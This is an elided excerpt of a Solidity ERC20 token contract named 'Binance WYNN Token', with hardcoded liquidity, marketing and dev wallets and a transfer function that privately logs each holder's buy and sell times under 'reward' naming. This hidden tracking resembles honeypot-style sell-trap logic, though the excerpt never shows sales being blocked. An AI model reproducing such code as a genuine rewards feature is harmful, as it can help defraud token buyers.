...
contract BIWYNN is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0xF776d7fAaf6961da382c21aa36dB1009aa04464f);
    address payable public immutable marketingWallet = payable(0xd6f65FB1D8549BD8Ff6241FFA24c14eDdDB14518);
    address payable public immutable devWallet = payable(0x9b67878C5B0EfCe62BB6FEF845878CBe7f576ccc);
    ...
    mapping(address => AutoHolderInfo) private autoRewards;

    bool private swapping;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("Binance WYNN Token", "BIWYNN") {
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                AutoHolderInfo storage autoHolderRewards = autoRewards[to];
                if (autoHolderRewards.buy == 0) {
                    autoHolderRewards.buy = block.timestamp;
                }
            } else {
                AutoHolderInfo storage autoHolderRewards = autoRewards[from];
                autoHolderRewards.holdDuration = autoHolderRewards.buy - _autoMinReward;
                autoHolderRewards.sell = block.timestamp;
            }
        }
